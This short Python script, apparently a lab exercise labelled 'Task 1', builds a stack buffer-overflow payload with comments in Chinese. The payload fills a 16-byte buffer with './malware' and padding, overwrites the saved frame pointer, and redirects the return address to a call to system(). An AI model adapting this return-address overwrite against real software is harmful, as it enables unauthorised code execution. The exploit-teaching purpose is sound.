#!/usr/bin/env python3
"""Task 1: build the payload for attack/malware."""
import sys

# 缓冲区16字节：command_buf里只留"./malware"，0x00让strcpy复制到这里就结束
payload  = b"./malware\x00"
payload += b"A" * 6

# 8字节B覆盖saved RBP，再把返回地址改成0x401a6b（mov edi,0x6030d0; call system@plt）
payload += b"B" * 8
payload += b"\x6b\x1a\x40\x00\x00\x00\x00\x00"

# gets遇到换行结束读取
payload += b"\n"

sys.stdout.buffer.write(payload)
